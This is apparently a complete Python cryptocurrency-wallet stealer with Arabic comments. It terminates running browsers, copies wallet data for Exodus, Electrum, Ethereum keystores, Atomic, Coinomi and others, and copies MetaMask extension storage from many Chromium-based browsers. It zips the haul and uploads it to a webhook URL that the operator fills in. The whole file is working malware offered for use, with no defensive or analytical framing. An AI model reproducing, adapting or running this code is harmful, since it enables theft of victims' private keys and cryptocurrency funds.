import os
import requests
from shutil import copytree, rmtree
import zipfile
import signal

# قائمة العمليات التي تتعلق بالمتصفحات باستثناء فايرفوكس
browsers = [
    "chrome.exe", "brave.exe", "opera.exe", "edge.exe",
    "iexplore.exe", "safari.exe", "vivaldi.exe", "yandex.exe"
]

# دالة لقتل العمليات
def kill_process(process_name):
    try:
        # تحقق إذا كانت العملية شغالة
        process_check = os.popen(f'tasklist /fi "imagename eq {process_name}"').read()
        
        if process_name in process_check:
            # استخراج الـ PID
            pid = os.popen(f'tasklist /fi "imagename eq {process_name}"').read().split()[5]
            
            # قتل العملية باستخدام الـ PID
            os.kill(int(pid), signal.SIGTERM)
            print(f"تم قتل العملية {process_name}")
        else:
            print(f"العملية {process_name} غير شغالة")
    
    except Exception as e:
        print(f"حدث خطأ: {e}")

for browser in browsers:
    kill_process(browser)

def send_to_webhook(file_path, webhook_url):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        response = requests.post(webhook_url, files=files)
    return response.json()

def st_wallets():
    # Get the current user's profile path automatically
    user_profile = os.getenv("USERPROFILE")  # Automatically fetches the user's home directory
    wallet_path = os.path.join(user_profile, "temp", "wallets", "Wallets")
    os.makedirs(wallet_path, exist_ok=True)

    wallets = (
        ("Zcash", os.path.join(os.getenv("appdata"), "Zcash")),
        ("Armory", os.path.join(os.getenv("appdata"), "Armory")),
        ("Bytecoin", os.path.join(os.getenv("appdata"), "Bytecoin")),
        ("Jaxx", os.path.join(os.getenv("appdata"), "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
        ("Exodus", os.path.join(os.getenv("appdata"), "Exodus", "exodus.wallet")),
        ("Ethereum", os.path.join(os.getenv("appdata"), "Ethereum", "keystore")),
        ("Electrum", os.path.join(os.getenv("appdata"), "Electrum", "wallets")),
        ("AtomicWallet", os.path.join(os.getenv("appdata"), "atomic", "Local Storage", "leveldb")),
        ("Guarda", os.path.join(os.getenv("appdata"), "Guarda", "Local Storage", "leveldb")),
        ("Coinomi", os.path.join(os.getenv("localappdata"), "Coinomi", "Coinomi", "wallets")),
    )

    browser_paths = {
        "Brave": os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Chrome": os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
        "Chromium": os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
        "Comodo": os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
        "Edge": os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
        "EpicPrivacy": os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
        "Iridium": os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
        "Opera": os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
        "Slimjet": os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
        "UR": os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
        "Vivaldi": os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
        "Yandex": os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
    }

    for name, path in wallets:
        if os.path.isdir(path):
            named_wallet_path = os.path.join(wallet_path, name)
            os.makedirs(named_wallet_path, exist_ok=True)
            try:
                if path != named_wallet_path:
                    copytree(path, os.path.join(named_wallet_path, os.path.basename(path)), dirs_exist_ok=True)
            except Exception:
                pass

    for name, path in browser_paths.items():
        if os.path.isdir(path):
            for root, dirs, _ in os.walk(path):
                for dir_name in dirs:
                    if dir_name == "Local Extension Settings":
                        local_extensions_settings_dir = os.path.join(root, dir_name)
                        for ext_dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn"):
                            ext_path = os.path.join(local_extensions_settings_dir, ext_dir)
                            metamask_browser = os.path.join(wallet_path, "Metamask ({})".format(name))
                            named_wallet_path = os.path.join(metamask_browser, ext_dir)
                            if os.path.isdir(ext_path) and os.listdir(ext_path):
                                try:
                                    copytree(ext_path, named_wallet_path, dirs_exist_ok=True)
                                except Exception:
                                    pass
                                else:
                                    if not os.listdir(metamask_browser):
                                        rmtree(metamask_browser)

    # Create a zip file of the collected wallets
    zip_file_path = os.path.join(wallet_path, 'wallet_backup.zip')
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(wallet_path):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), wallet_path))

    # Send the zip file to Webhook
    webhook_url = 'WEBHOOKS_URL'  # استبدل هذا بعنوان الويبهوك الخاص بك
    send_to_webhook(zip_file_path, webhook_url)

# Call the function
st_wallets()
